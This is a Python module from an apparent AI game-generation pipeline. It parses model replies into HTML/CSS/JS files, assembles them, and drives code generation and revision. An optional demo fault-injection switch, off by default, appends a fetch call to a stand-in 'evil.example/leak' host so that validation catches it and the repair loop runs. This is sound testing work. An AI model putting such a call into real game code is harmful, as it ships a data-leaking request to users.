"""Code generation and revision nodes for the GameWeave LangGraph pipeline."""
# ruff: noqa: F401,F403,F405
from app.agents.nodes_common import *


def _should_inject(state: dict) -> bool:
    """演示用故障注入（默认关闭）。开启后 prompt 含 force-repair/force-replan
    会故意注入违禁 API 触发修复回环 —— 必须由配置显式打开，绝不能让普通用户的
    prompt 文本改变引擎行为（用户创意里碰巧出现关键词会白烧一轮修复预算）。"""
    from app.core.config import settings

    if not settings.DEMO_FAULT_INJECTION:
        return False
    p = (state.get("normalized_prompt") or state.get("prompt") or "").lower()
    if "force-replan" in p:
        return state.get("replan_attempts", 0) == 0
    if "force-repair" in p:
        return state.get("repair_attempts", 0) == 0
    return False


def _extract_js(raw: str) -> str:
    if not raw:
        return ""
    match = re.search(r"```(?:javascript|js)?\s*(.*?)```", raw, re.S | re.I)
    text = (match.group(1) if match else raw).strip()
    return re.sub(r"</?script[^>]*>", "", text, flags=re.I).strip()


def _extract_bundle(raw: str) -> dict:
    """Parse a model reply into {path: content}. Expects three fenced blocks
    (html / css / js); degrades gracefully when labels are missing or merged."""
    if not raw:
        return {}
    out: dict[str, str] = {}
    for lang, path in (("html", "index.html"), ("css", "style.css"), ("javascript", "game.js"), ("js", "game.js")):
        if path in out:
            continue
        m = re.search(r"```[ \t]*" + lang + r"[^\n]*\n(.*?)```", raw, re.S | re.I)
        if m:
            out[path] = m.group(1).strip()
    # A long streaming response can be interrupted after opening the final
    # fenced block but before the closing fence arrives. Keep that partial block
    # so validation/repair can decide whether it is usable instead of throwing
    # away minutes of generated code.
    for lang, content in re.findall(
        r"```[ \t]*(html|css|javascript|js)[^\n]*\n(.*?)(?:```|\Z)",
        raw,
        re.S | re.I,
    ):
        path = "game.js" if lang.lower() in {"javascript", "js"} else ("style.css" if lang.lower() == "css" else "index.html")
        if path not in out and content.strip():
            out[path] = content.strip()
    if "game.js" in out:
        return out
    # Fallback: classify unlabeled fenced blocks by their content.
    for block in re.findall(r"```[^\n]*\n(.*?)```", raw, re.S):
        block = block.strip()
        low = block[:400].lower()
        if "index.html" not in out and ("<!doctype" in low or "<html" in low):
            out["index.html"] = block
        elif "game.js" not in out and "<html" not in low and any(
            tok in low for tok in ("getcontext", "requestanimationframe", "addeventlistener", "function ", "=>")
        ):
            out["game.js"] = block
        elif "style.css" not in out and "<" not in low and "{" in block and "}" in block:
            out["style.css"] = block
    if "game.js" not in out and not out:
        js = _extract_js(raw)
        if js:
            out["game.js"] = js
    return out


_DEFAULT_CSS = (
    "*{margin:0;padding:0;box-sizing:border-box}"
    "html,body{height:100%;overflow:hidden;background:#05070f;"
    "font-family:ui-monospace,monospace;-webkit-user-select:none;user-select:none;touch-action:none}"
    "canvas{display:block;position:absolute;inset:0}"
)


def _assemble_bundle(bundle: dict, title: str, dimension: str = "2d", runtime: str = "canvas") -> list[dict]:
    """Turn parsed model files into the canonical 3-file bundle; synthesize a
    minimal index.html / style.css when the model only returned game.js.
    Ensure the self-hosted engine (3D: three.min.js / 2D-phaser: phaser.min.js)
    loads before game.js."""
    js = bundle.get("game.js", "")
    css = bundle.get("style.css") or _DEFAULT_CSS
    index = bundle.get("index.html")
    engine = "three.min.js" if dimension == "3d" else ("phaser.min.js" if runtime == "phaser" else None)
    engine_tag = f'<script src="{engine}"></script>' if engine else ""
    if not index or "game.js" not in index:
        index = (
            '<!doctype html><html><head><meta charset="utf-8">'
            '<meta name="viewport" content="width=device-width,initial-scale=1">'
            f"<title>{title}</title>"
            '<link rel="stylesheet" href="style.css"></head><body>'
            '<canvas id="stage"></canvas>'
            f'{engine_tag}<script src="game.js"></script></body></html>'
        )
    elif engine and engine not in index:
        # 模型给了 index 但漏了引擎：插到 <head> 末尾，确保先于 game.js 执行。
        if "</head>" in index:
            index = index.replace("</head>", f"{engine_tag}</head>", 1)
        else:
            index = index.replace("<body>", f"<body>{engine_tag}", 1)
    return [
        {"path": "index.html", "content": index},
        {"path": "style.css", "content": css},
        {"path": "game.js", "content": js},
    ]


_REFERENCE_BY_ARCHETYPE = {
    "vertical_shooter": "neondodge",
    "lane_runner": "neondodge",
    "topdown_collect": "moonlitkoi",
    "logic_grid": "runecircuit",
}


_REFERENCE_BY_GENRE = {
    "shooter": "neondodge",
    "runner": "neondodge",
    "arcade": "moonlitkoi",
    "collector": "starcatch",
    "puzzle": "runecircuit",
    "quiz": "colormatch",
}


_REFERENCE_BY_ARCHETYPE_3D = {
    "fps_arena": "warpspire",
    "collector_3d": "warpspire",
    "runner_3d": "warpspire",
    "racer_3d": "warpspire",
}


def _reference_for(spec: dict) -> str | None:
    if str(spec.get("dimension") or "") == "3d":
        key = _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or "")) or "warpspire"
        return bundles.BUNDLES.get(key)
    archetype = str(spec.get("archetype") or "")
    genre = str(spec.get("genre") or "").lower()
    key = _REFERENCE_BY_ARCHETYPE.get(archetype) or _REFERENCE_BY_GENRE.get(genre) or "moonlitkoi"
    return bundles.BUNDLES.get(key)


def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str, list[str]]:
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    title = str(spec.get("title") or "GameWeave Game")
    agent_logs: list[str] = []

    # 3D：无模板兜底，完全由模型产出。失败/过短 → 返回不合规 bundle，交给 repair/replan。
    if state.get("dimension") == "3d":
        files: list[dict] = []
        tokens = 0
        if not state.get("use_real"):
            mode = "3D needs real model (offline mock cannot author 3D)"
        else:
            try:
                result = llm.chat(
                    prompts.CODE_SYSTEM_PROMPT_3D,
                    prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, dimension="3d"),
                    timeout=settings.OPENAI_CODE_TIMEOUT,
                    allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
                )
                raw, tokens = result
                bundle = _extract_bundle(raw)
                js = bundle.get("game.js", "")
                files = _assemble_bundle(bundle, title, dimension="3d")
                if js and len(js) > 400:
                    partial = "partial " if getattr(result, "partial", False) else ""
                    mode = f"model ({partial}full 3D bundle)" if bundle.get("index.html") else f"model ({partial}3D game.js)"
                else:
                    mode = "model 3D output too short -> QA/repair"
            except Exception as exc:  # noqa: BLE001
                _real_model_fallback_or_raise("GameCodeAgent", exc, exc)
                files = []
                mode = f"model 3D failed: {_clip(exc, 120)}"
        if _should_inject(state):
            for file in files:
                if file["path"] == "game.js":
                    file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
        return files, tokens, mode, agent_logs

    # ---- 2D：确定性模板基线 + 模型优先覆盖（原逻辑）----
    tname = templating.select_template(spec, design)
    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
    files = templating.render_files(tname, cfg)
    tokens = 0
    mode = "template"

    if state.get("use_real") and not state.get("use_template_code"):
        # PHASER_2D_ENABLED 试点：2D 模型产出切换到 Phaser 4 运行时（提示词内嵌
        # 官方 skills 蒸馏的 API 备忘单）；模板兜底与失败回退仍是 Canvas。
        use_phaser = bool(settings.PHASER_2D_ENABLED)
        runtime = "phaser" if use_phaser else "canvas"
        authored = False
        if repair_error is None and code_agent.author_enabled(state):
            # Author mode starts from the skeleton and writes through the tool loop.
            # REAL_MODEL_FALLBACK_ENABLED controls whether author failure may use
            # the legacy one-shot generation path; disabled stops the task here.
            skeleton = _assemble_bundle({}, cfg.get("title") or "GameWeave Game", runtime=runtime)
            outcome = code_agent.run_author(skeleton, spec=spec, design=design, runtime=runtime)
            author_js = ""
            if outcome:
                author_js = next((f["content"] for f in outcome.files if f["path"] == "game.js"), "")
                agent_logs = list(outcome.logs)
            if outcome and len(author_js) > 400:
                files = outcome.files
                tokens = outcome.tokens
                mode = (
                    f"agent author ({len(files)} file(s), {outcome.turns} turn(s), "
                    f"checks {'ok' if outcome.checks_ok else 'pending'})"
                )
                authored = True
            else:
                detail = "author agent unavailable or output too short"
                _real_model_fallback_or_raise("GameCodeAuthor", detail)
                agent_logs.append(f"{detail}; falling back to one-shot generation")
        if not authored:
            try:
                result = llm.chat(
                    prompts.CODE_SYSTEM_PROMPT_PHASER if use_phaser else prompts.CODE_SYSTEM_PROMPT,
                    prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, runtime=runtime),
                    timeout=settings.OPENAI_CODE_TIMEOUT,
                    allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
                )
                raw, tokens = result
                bundle = _extract_bundle(raw)
                js = bundle.get("game.js", "")
                if js and len(js) > 400:
                    files = _assemble_bundle(bundle, cfg.get("title") or "GameWeave Game", runtime=runtime)
                    shape = "full bundle" if bundle.get("index.html") else "game.js"
                    partial = "partial " if getattr(result, "partial", False) else ""
                    mode = f"model ({partial}phaser {shape})" if use_phaser else f"model ({partial}{shape})"
                else:
                    _real_model_fallback_or_raise("GameCodeAgent", "model output too short")
                    mode = "template (model output too short)"
            except Exception as exc:  # noqa: BLE001
                _real_model_fallback_or_raise("GameCodeAgent", exc, exc)
                mode = f"template (model failed: {_clip(exc, 120)})"
    elif state.get("use_real") and state.get("use_template_code"):
        _real_model_fallback_or_raise("GameCodeAgent", "template-code fallback requested")

    if _should_inject(state):
        for file in files:
            if file["path"] == "game.js":
                file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
    return files, tokens, mode, agent_logs


def _revision_file_map(files: list[dict] | None) -> dict[str, str]:
    # 全量文件按原顺序进 map：修订提示词的 html/css/js 标签只寻址三件套，
    # 作者模式产出的额外模块（shop.js 等）原样保留、字节不动。
    return {
        str(file.get("path")): str(file.get("content") or "")
        for file in (files or [])
        if file.get("path")
    }


def _generate_revision_code(
    state: dict, repair_error: str | None = None
) -> tuple[list[dict], int, list[str], str]:
    source_files = (
        state.get("generated_files")
        if repair_error and state.get("generated_files")
        else state.get("existing_files")
    ) or []
    source = _revision_file_map(source_files)
    if not state.get("use_real"):
        merged = dict(source)
        feedback = _clip(state.get("source_feedback") or state.get("prompt") or "", 180)
        if "game.js" in merged:
            marker = re.sub(r"[\r\n]+", " ", feedback)
            merged["game.js"] = f"{merged['game.js']}\n// GameWeave offline {state.get('task_kind', 'revision')} note: {marker}\n"
            changed = ["game.js"]
        else:
            changed = []
        files = [{"path": path, "content": content} for path, content in merged.items()]
        return files, 0, changed, f"offline deterministic {state.get('task_kind', 'revision')}"

    result = llm.chat(
        prompts.CODE_REVISION_SYSTEM_PROMPT,
        prompts.build_code_revision_prompt(
            state.get("source_feedback") or state.get("prompt") or "",
            state.get("feedback_brief") or "",
            state.get("game_spec") or {},
            state.get("game_design") or {},
            source_files,
            repair_error,
            state.get("memory_context") or "",
        ),
        timeout=settings.OPENAI_CODE_TIMEOUT,
        allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
    )
    raw, tokens = result
    returned = _extract_bundle(raw)
    merged = dict(source)
    changed: list[str] = []
    for path in ("index.html", "style.css", "game.js"):
        content = returned.get(path)
        if content is None or content == source.get(path):
            continue
        merged[path] = content
        changed.append(path)
    files = [{"path": path, "content": content} for path, content in merged.items()]
    partial = "partial " if getattr(result, "partial", False) else ""
    return files, tokens, changed, f"model {partial}incremental revision"


def code_revision_node(state: dict) -> dict:
    try:
        files, tokens, changed, mode = _generate_revision_code(state)
    except Exception as exc:  # noqa: BLE001
        if state.get("use_real"):
            _real_model_fallback_or_raise("CodeRevisionAgent", exc, exc)
        files, tokens, changed, mode = state.get("existing_files") or [], 0, [], f"revision failed: {_clip(exc, 160)}"
    return {
        "generated_files": files,
        "revision_result": {"changed_files": changed, "base_version": state.get("base_version")},
        "_agent": "CodeRevisionAgent",
        "_tokens_delta": tokens,
        "_logs": [
            f"base version: {state.get('base_version')}",
            f"revision mode: {mode}",
            "changed files: " + (", ".join(changed) if changed else "none"),
        ] + _file_log_lines(files),
    }


def code_generation_node(state: dict) -> dict:
    files, tokens, mode, agent_logs = _generate_code(state)
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    if state.get("dimension") == "3d":
        scene = design.get("scene") if isinstance(design.get("scene"), dict) else {}
        logs = [
            "render mode: 3D WebGL via self-hosted Three.js (relative three.min.js, global THREE)",
            f"archetype: {spec.get('archetype')} ({(state.get('archetype_result') or {}).get('label', '3D')})",
            f"camera/scene: {scene.get('camera', 'n/a')} · {_clip(scene.get('environment'), 80)}",
            "few-shot reference: " + _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or ""), "three_fps"),
            f"game.js source: {mode}",
        ] + _file_log_lines(files)
    else:
        cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
        tname = templating.select_template(spec, design)
        logs = [
            f"selected template: {tname}",
            f"runtime config: archetype={cfg.get('archetype')}, duration={cfg.get('duration')}s, target={cfg.get('target_score')}, lives={cfg.get('lives')}",
            f"difficulty config: hazard_speed={cfg.get('hazard_speed')}, hazard_spawn={cfg.get('hazard_spawn_ms')}ms, max_hazards={cfg.get('max_hazards')}",
            f"mechanic content: {cfg.get('mechanic_label')} with {cfg.get('wave_count')} wave(s)",
            f"control hint: {_clip(cfg.get('hint'), 90)}",
            f"game.js source: {mode}",
        ] + _file_log_lines(files)
    if agent_logs:
        logs += agent_logs
    if _should_inject(state):
        logs.append("[demo] injected forbidden API to trigger repair loop")
    return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}


__all__ = [
    '_should_inject',
    '_extract_js',
    '_extract_bundle',
    '_DEFAULT_CSS',
    '_assemble_bundle',
    '_REFERENCE_BY_ARCHETYPE',
    '_REFERENCE_BY_GENRE',
    '_REFERENCE_BY_ARCHETYPE_3D',
    '_reference_for',
    '_generate_code',
    '_revision_file_map',
    '_generate_revision_code',
    'code_revision_node',
    'code_generation_node',
]
